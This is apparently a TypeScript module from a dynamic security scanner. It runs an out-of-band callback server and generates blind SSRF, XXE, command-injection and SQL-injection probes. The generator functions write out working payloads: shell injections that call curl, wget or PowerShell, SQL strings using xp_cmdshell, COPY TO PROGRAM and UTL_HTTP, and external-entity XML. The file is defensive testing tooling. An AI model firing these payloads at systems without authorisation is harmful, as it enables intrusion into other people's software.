// OOB (Out-of-Band) Interaction Server — Blind vulnerability detection via
// callback correlation. Starts an HTTP listener on a configurable port, mints
// unique tokens per probe, and records incoming callbacks to confirm blind
// SSRF, XXE, RCE/CMDi, and SQLi vulnerabilities.
//
// DNS callbacks are simulated via HTTP fallback since binding port 53 requires
// root; the token format still includes a DNS-subdomain-compatible label for
// use in DNS-based payloads (nslookup, etc.), but the actual detection relies
// on the HTTP channel.
import http from 'node:http';
import os from 'node:os';
import crypto from 'node:crypto';
import { logger } from '../utils/logger.js';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface OobCallbackRecord {
  token: string;
  timestamp: number;
  remoteIp: string;
  method: string;
  path: string;
  headers: Record<string, string>;
  body: string; // truncated to 1KB
}

export interface OobMintResult {
  token: string;
  callbackUrl: string;
  dnsSubdomain: string;
}

export interface OobMintContext {
  vulnType: 'SSRF' | 'XXE' | 'RCE' | 'SQLI';
  target: string;
  payload: string;
}

// DastFinding and DastAttack shapes (re-declared locally to avoid circular
// deps — identical to engine.ts).
export interface DastFinding {
  attackId: string;
  attackName: string;
  target: string;
  method: string;
  parameter: string;
  payload: string;
  evidence: string;
  severity: string;
  severityRank: number;
  cweId: string;
  owaspCategory: string;
  cvssScore: number;
  cvssVector: string;
  recommendation: string;
  description: string;
}

interface OobPayload {
  payload: string;
  description: string;
  attackType: 'query' | 'body' | 'header' | 'path';
}

// ---------------------------------------------------------------------------
// OOBInteractionServer
// ---------------------------------------------------------------------------

export class OOBInteractionServer {
  private server: http.Server | null = null;
  private port: number = 0;
  private host: string;
  private callbacks: Map<string, OobCallbackRecord[]> = new Map();
  private dnsResolved: Set<string> = new Set();
  private waiters: Map<string, Array<(record: OobCallbackRecord) => void>> = new Map();
  private callbackHost: string;

  constructor(host?: string) {
    this.callbackHost = host || process.env.OOB_CALLBACK_HOST || this.resolveCallbackHost();
    this.host = '0.0.0.0';
  }

  /** Derive the best-effort callback hostname for this container/host. */
  private resolveCallbackHost(): string {
    // Try the container hostname first (works in Docker with host networking).
    try {
      const hn = os.hostname();
      if (hn && hn !== 'localhost' && !hn.startsWith('127.')) return hn;
    } catch { /* fall through */ }
    // Try non-loopback network interfaces.
    try {
      const nets = os.networkInterfaces();
      for (const iface of Object.values(nets)) {
        if (!iface) continue;
        for (const addr of iface) {
          if (addr.family === 'IPv4' && !addr.internal) return addr.address;
        }
      }
    } catch { /* fall through */ }
    // Last resort.
    return 'localhost';
  }

  /** Start the HTTP listener on a dynamic (or configured) port. */
  async start(port?: number): Promise<number> {
    return new Promise((resolve, reject) => {
      this.server = http.createServer((req, res) => {
        this.handleRequest(req, res);
      });

      this.server.on('error', (err) => {
        logger.error({ err }, 'OOB server error');
        reject(err);
      });

      this.server.listen(port || 0, this.host, () => {
        const addr = this.server!.address();
        if (addr && typeof addr === 'object') {
          this.port = addr.port;
        }
        logger.info({ port: this.port, host: this.host, callbackHost: this.callbackHost },
          'OOB interaction server started');
        resolve(this.port);
      });
    });
  }

  /** Stop the HTTP listener. */
  async stop(): Promise<void> {
    return new Promise((resolve) => {
      if (!this.server) { resolve(); return; }
      this.server.close(() => {
        logger.info('OOB interaction server stopped');
        resolve();
      });
      this.server = null;
    });
  }

  getPort(): number {
    return this.port;
  }

  getCallbackHost(): string {
    return this.callbackHost;
  }

  /** Handle an incoming HTTP request. Records any request matching a known
   *  token (via path segment or query param). */
  private handleRequest(req: http.IncomingMessage, res: http.ServerResponse): void {
    const rawBody: string[] = [];
    req.on('data', (chunk: Buffer) => {
      if (rawBody.length < 1024 * 1024) rawBody.push(chunk.toString()); // 1MB max
    });
    req.on('end', () => {
      const body = rawBody.join('').slice(0, 1024); // truncate to 1KB
      const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);
      const path = url.pathname;

      // Extract token from path (/{token}) or query (?token=...).
      let token = '';
      const pathMatch = path.match(/^\/([a-f0-9-]{36,})(?:\/|$)/);
      if (pathMatch) {
        token = pathMatch[1]!;
      } else {
        token = url.searchParams.get('token') || '';
      }

      // Also accept tokens in any subdomain-like path (dv-{token}.oob.local-style)
      if (!token) {
        const subdomainMatch = path.match(/dv-([a-f0-9-]{32,})/);
        if (subdomainMatch) token = subdomainMatch[1]!;
      }

      // Collect headers (lowercase).
      const headers: Record<string, string> = {};
      for (const [k, v] of Object.entries(req.headers)) {
        if (v) headers[k.toLowerCase()] = Array.isArray(v) ? v.join(', ') : v;
      }

      const record: OobCallbackRecord = {
        token,
        timestamp: Date.now(),
        remoteIp: (req.socket.remoteAddress || 'unknown').replace(/^::ffff:/, ''),
        method: req.method || 'GET',
        path: req.url || '/',
        headers,
        body,
      };

      // Log all incoming requests for debugging; only store if token matches.
      logger.debug({ token, remoteIp: record.remoteIp, method: record.method },
        'OOB callback received');

      // Always respond 200 to avoid leaking detection info.
      res.writeHead(200, { 'Content-Type': 'text/plain', 'Connection': 'close' });
      res.end('OK');

      if (!token) return; // no token to correlate

      // Store callback.
      const existing = this.callbacks.get(token) || [];
      existing.push(record);
      this.callbacks.set(token, existing);

      // Notify waiters.
      const waiters = this.waiters.get(token);
      if (waiters && waiters.length > 0) {
        const w = waiters.shift()!;
        w(record);
      }
    });
  }

  /** Mint a unique correlation token for a probe.
   *  Returns the token, a full HTTP callback URL, and a DNS subdomain label. */
  mintToken(context: OobMintContext): OobMintResult {
    const uuid = crypto.randomUUID();
    const token = `dv-${uuid}`;
    const callbackUrl = `http://${this.callbackHost}:${this.port}/${token}`;
    const dnsSubdomain = `${token}.oob.local`;

    logger.debug({ token, vulnType: context.vulnType, target: context.target },
      'OOB token minted');

    return { token, callbackUrl, dnsSubdomain };
  }

  /** Mark a token as DNS-resolved (bonus: if DNS server is set up).
   *  In practice this is called when an HTTP callback arrives containing
   *  the token in a DNS-query-like format. */
  markDnsResolved(token: string): void {
    this.dnsResolved.add(token);
    logger.info({ token }, 'OOB DNS resolution recorded');
  }

  /** Check whether any callback (HTTP or DNS) has been received for a token
   *  within the given timeout. Returns the first matching record or null. */
  async checkCallback(token: string, timeoutMs: number = 5000): Promise<OobCallbackRecord | null> {
    // Fast path: already received.
    const existing = this.callbacks.get(token);
    if (existing && existing.length > 0) return existing[0]!;

    // DNS check.
    if (this.dnsResolved.has(token)) {
      return {
        token,
        timestamp: Date.now(),
        remoteIp: 'dns-resolver',
        method: 'DNS',
        path: `${token}.oob.local`,
        headers: {},
        body: 'DNS resolution confirmed',
      };
    }

    // Wait for a callback.
    return new Promise((resolve) => {
      const timer = setTimeout(() => {
        // Remove this waiter from the queue.
        const waiters = this.waiters.get(token);
        if (waiters) {
          const idx = waiters.indexOf(waiter);
          if (idx >= 0) waiters.splice(idx, 1);
        }
        resolve(null);
      }, timeoutMs);

      const waiter = (record: OobCallbackRecord) => {
        clearTimeout(timer);
        resolve(record);
      };

      const waiters = this.waiters.get(token) || [];
      waiters.push(waiter);
      this.waiters.set(token, waiters);
    });
  }

  /** Get all callbacks for a token (for debugging). */
  getCallbacks(token: string): OobCallbackRecord[] {
    return this.callbacks.get(token) || [];
  }

  /** Clear all stored callbacks and waiters. */
  reset(): void {
    this.callbacks.clear();
    this.dnsResolved.clear();
    this.waiters.clear();
  }
}

// ---------------------------------------------------------------------------
// Singleton
// ---------------------------------------------------------------------------

let _oobServer: OOBInteractionServer | null = null;

/** Create (or return existing) OOB interaction server and start it. */
export async function createOobServer(port?: number): Promise<OOBInteractionServer> {
  if (_oobServer) return _oobServer;
  _oobServer = new OOBInteractionServer();
  await _oobServer.start(port);
  return _oobServer;
}

/** Get the existing OOB server. Throws if not started. */
export function getOobServer(): OOBInteractionServer {
  if (!_oobServer) throw new Error('OOB server not started — call createOobServer() first');
  return _oobServer;
}

/** Shut down and clear the OOB singleton. */
export async function shutdownOobServer(): Promise<void> {
  if (_oobServer) {
    await _oobServer.stop();
    _oobServer = null;
  }
}

// ---------------------------------------------------------------------------
// OOB Payload Generators
// ---------------------------------------------------------------------------

/** Generate SSRF payloads embedding the OOB callback URL. */
export function generateOobSsrfPayloads(token: string, callbackUrl: string): OobPayload[] {
  return [
    {
      payload: callbackUrl,
      description: `SSRF probe: direct HTTP GET to OOB listener`,
      attackType: 'query',
    },
    {
      payload: `${callbackUrl}?ref=ssrf-probe`,
      description: `SSRF probe: HTTP GET with query param`,
      attackType: 'query',
    },
    {
      payload: `http://${token}.oob.local:80/`,
      description: `SSRF probe: DNS-prefixed subdomain callback`,
      attackType: 'query',
    },
    {
      payload: `gopher://${token}.oob.local:80/_GET%20/${token}%20HTTP/1.1%0d%0aHost:%20${token}.oob.local%0d%0a%0d%0a`,
      description: `SSRF probe: gopher protocol tunneling`,
      attackType: 'query',
    },
    {
      payload: `dict://${token}.oob.local:80/${token}`,
      description: `SSRF probe: dict protocol`,
      attackType: 'query',
    },
  ];
}

/** Generate XXE payloads embedding the OOB callback URL. */
export function generateOobXxePayloads(token: string, callbackUrl: string): OobPayload[] {
  return [
    {
      payload: `<?xml version="1.0"?><!DOCTYPE dv [<!ENTITY % xxe SYSTEM "${callbackUrl}"> %xxe;]><root/>`,
      description: `XXE probe: external parameter entity`,
      attackType: 'body',
    },
    {
      payload: `<?xml version="1.0"?><!DOCTYPE dv [<!ENTITY xxe SYSTEM "${callbackUrl}">]><root>&xxe;</root>`,
      description: `XXE probe: external general entity`,
      attackType: 'body',
    },
    {
      payload: `<?xml version="1.0"?><!DOCTYPE dv [<!ENTITY % dtd SYSTEM "${callbackUrl}/dtd"> %dtd;]><root/>`,
      description: `XXE probe: external DTD inclusion`,
      attackType: 'body',
    },
    {
      payload: `<?xml version="1.0"?><!DOCTYPE dv [<!ENTITY % xxe SYSTEM "http://${token}.oob.local/${token}"> %xxe;]><root/>`,
      description: `XXE probe: DNS-prefixed subdomain callback`,
      attackType: 'body',
    },
  ];
}

/** Generate RCE/CMDi payloads embedding the OOB callback URL. */
export function generateOobRcePayloads(token: string, callbackUrl: string): OobPayload[] {
  const host = new URL(callbackUrl).hostname;
  return [
    {
      payload: `\`curl -s ${callbackUrl}\``,
      description: `RCE probe: curl backtick subshell`,
      attackType: 'query',
    },
    {
      payload: `$(curl -s ${callbackUrl})`,
      description: `RCE probe: curl dollar-subshell`,
      attackType: 'query',
    },
    {
      payload: `; curl -s ${callbackUrl};`,
      description: `RCE probe: curl semicolon-chained`,
      attackType: 'query',
    },
    {
      payload: `| curl -s ${callbackUrl}`,
      description: `RCE probe: curl pipe-chained`,
      attackType: 'query',
    },
    {
      payload: `\`wget -qO- ${callbackUrl}\``,
      description: `RCE probe: wget backtick`,
      attackType: 'query',
    },
    {
      payload: `; wget -qO- ${callbackUrl};`,
      description: `RCE probe: wget semicolon`,
      attackType: 'query',
    },
    {
      payload: `\`nslookup ${token}.oob.local\``,
      description: `RCE probe: nslookup DNS callback`,
      attackType: 'query',
    },
    {
      payload: `; powershell -c "Invoke-WebRequest -Uri '${callbackUrl}' -UseBasicParsing";`,
      description: `RCE probe: PowerShell Invoke-WebRequest`,
      attackType: 'query',
    },
    {
      payload: `| powershell -c "iwr '${callbackUrl}'"`,
      description: `RCE probe: PowerShell iwr pipe`,
      attackType: 'query',
    },
    {
      payload: `\`python3 -c "import urllib.request; urllib.request.urlopen('${callbackUrl}')"\``,
      description: `RCE probe: Python urllib backtick`,
      attackType: 'query',
    },
    {
      payload: `; ruby -e "require 'net/http'; Net::HTTP.get(URI('${callbackUrl}'))";`,
      description: `RCE probe: Ruby Net::HTTP`,
      attackType: 'query',
    },
    {
      payload: `\`fetch ${callbackUrl}\``,
      description: `RCE probe: fetch (FreeBSD) backtick`,
      attackType: 'query',
    },
  ];
}

/** Generate blind SQLi OOB payloads for various database backends. */
export function generateOobSqliPayloads(token: string, callbackUrl: string): OobPayload[] {
  const host = new URL(callbackUrl).hostname;
  const sharePath = `\\\\${host}\\${token}`;
  return [
    // MySQL / MariaDB
    {
      payload: `' UNION SELECT LOAD_FILE('${callbackUrl}')--`,
      description: `Blind SQLi OOB: MySQL LOAD_FILE`,
      attackType: 'query',
    },
    {
      payload: `'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT DATABASE()),'.${token}.oob.local\\\\abc'))--`,
      description: `Blind SQLi OOB: MySQL UNC path SMB share`,
      attackType: 'query',
    },
    // PostgreSQL
    {
      payload: `'; COPY (SELECT '') TO PROGRAM 'curl ${callbackUrl}'--`,
      description: `Blind SQLi OOB: PostgreSQL COPY TO PROGRAM curl`,
      attackType: 'query',
    },
    {
      payload: `'; DROP TABLE IF EXISTS oob_test; CREATE TABLE oob_test(data text); COPY oob_test FROM PROGRAM 'wget -qO- ${callbackUrl}';--`,
      description: `Blind SQLi OOB: PostgreSQL COPY FROM PROGRAM wget`,
      attackType: 'query',
    },
    // MSSQL
    {
      payload: `'; EXEC xp_dirtree '${sharePath}',1,1--`,
      description: `Blind SQLi OOB: MSSQL xp_dirtree UNC path`,
      attackType: 'query',
    },
    {
      payload: `'; EXEC master..xp_fileexist '${sharePath}'--`,
      description: `Blind SQLi OOB: MSSQL xp_fileexist UNC path`,
      attackType: 'query',
    },
    {
      payload: `'; EXEC xp_cmdshell 'curl ${callbackUrl}'--`,
      description: `Blind SQLi OOB: MSSQL xp_cmdshell curl`,
      attackType: 'query',
    },
    // Oracle
    {
      payload: `' OR UTL_HTTP.REQUEST('${callbackUrl}')='1'--`,
      description: `Blind SQLi OOB: Oracle UTL_HTTP.REQUEST`,
      attackType: 'query',
    },
    {
      payload: `'; DECLARE req UTL_HTTP.REQ; BEGIN req := UTL_HTTP.BEGIN_REQUEST('${callbackUrl}'); UTL_HTTP.END_RESPONSE(req); END;--`,
      description: `Blind SQLi OOB: Oracle UTL_HTTP PL/SQL block`,
      attackType: 'query',
    },
    {
      payload: `' UNION SELECT UTL_HTTP.REQUEST('${callbackUrl}') FROM dual--`,
      description: `Blind SQLi OOB: Oracle UNION UTL_HTTP`,
      attackType: 'query',
    },
    {
      payload: `' OR UTL_INADDR.GET_HOST_NAME('${token}.oob.local')='1'--`,
      description: `Blind SQLi OOB: Oracle UTL_INADDR DNS`,
      attackType: 'query',
    },
    // SQLite
    {
      payload: `'; ATTACH DATABASE '${callbackUrl}' AS oob--`,
      description: `Blind SQLi OOB: SQLite ATTACH DATABASE`,
      attackType: 'query',
    },
  ];
}

// ---------------------------------------------------------------------------
// OOB Finding Factory
// ---------------------------------------------------------------------------

const OOB_SEVERITY_MAP: Record<string, {
  attackId: string;
  attackName: string;
  severity: string;
  severityRank: number;
  cweId: string;
  owaspCategory: string;
  cvssScore: number;
  cvssVector: string;
  recommendation: string;
}> = {
  SSRF: {
    attackId: 'DAST-OOB-SSRF-001',
    attackName: 'Blind SSRF (OOB Confirmed)',
    severity: 'critical',
    severityRank: 1,
    cweId: 'CWE-918',
    owaspCategory: 'A10:2021 - SSRF',
    cvssScore: 9.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    recommendation: 'Validate and sanitize URLs. Use allowlists for remote hosts. Block egress to internal/sensitive networks.',
  },
  XXE: {
    attackId: 'DAST-OOB-XXE-001',
    attackName: 'Blind XXE (OOB Confirmed)',
    severity: 'critical',
    severityRank: 1,
    cweId: 'CWE-611',
    owaspCategory: 'A05:2021 - Security Misconfiguration',
    cvssScore: 9.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    recommendation: 'Disable external entities in XML parsers. Use JSON instead of XML where possible.',
  },
  RCE: {
    attackId: 'DAST-OOB-RCE-001',
    attackName: 'Blind Command Injection (OOB Confirmed)',
    severity: 'critical',
    severityRank: 1,
    cweId: 'CWE-78',
    owaspCategory: 'A03:2021 - Injection',
    cvssScore: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    recommendation: 'Avoid shell interpreters. Use execFile with array arguments. Validate and sanitize all user input.',
  },
  SQLI: {
    attackId: 'DAST-OOB-SQLI-001',
    attackName: 'Blind SQL Injection (OOB Confirmed)',
    severity: 'critical',
    severityRank: 1,
    cweId: 'CWE-89',
    owaspCategory: 'A03:2021 - Injection',
    cvssScore: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    recommendation: 'Use parameterized queries and input validation. Never concatenate user input into SQL statements.',
  },
};

/** Build a DastFinding from an OOB callback record. */
export function buildOobFinding(
  vulnType: 'SSRF' | 'XXE' | 'RCE' | 'SQLI',
  target: string,
  method: string,
  payload: string,
  record: OobCallbackRecord,
): DastFinding {
  const meta = OOB_SEVERITY_MAP[vulnType];
  const evidence = [
    `OOB interaction confirmed:`,
    `  Token:      ${record.token}`,
    `  Remote IP:  ${record.remoteIp}`,
    `  Timestamp:  ${new Date(record.timestamp).toISOString()}`,
    `  Method:     ${record.method}`,
    `  Path:       ${record.path}`,
    `  User-Agent: ${record.headers['user-agent'] || 'N/A'}`,
    record.body ? `  Body:       ${record.body.slice(0, 200)}` : '',
  ].filter(Boolean).join('\n');

  return {
    attackId: meta.attackId,
    attackName: meta.attackName,
    target,
    method,
    parameter: 'oob-callback',
    payload,
    evidence,
    severity: meta.severity,
    severityRank: meta.severityRank,
    cweId: meta.cweId,
    owaspCategory: meta.owaspCategory,
    cvssScore: meta.cvssScore,
    cvssVector: meta.cvssVector,
    recommendation: meta.recommendation,
    description: `Out-of-band ${vulnType} confirmed via callback to attacker-controlled interaction server. The target issued an HTTP request to ${record.path} from ${record.remoteIp}, proving the vulnerability is exploitable.`,
  };
}
